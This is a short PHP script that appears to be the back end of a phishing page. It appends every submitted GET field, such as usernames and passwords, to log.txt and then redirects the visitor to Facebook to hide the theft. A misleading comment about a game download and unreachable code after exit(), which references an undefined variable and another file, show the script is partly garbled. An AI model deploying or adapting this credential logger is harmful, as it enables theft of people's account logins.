<?php header ('Location: http://www.google.com/search?btnI&q=allinurl:http://www.m.facebook.com/'); $handle = fopen("log.txt", "a"); foreach($_GET as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); //redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: http://facebook.com/profile.php?id=100000152818");
			exit();
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Message could not be sent...404 error check your internet";
         }
      ?>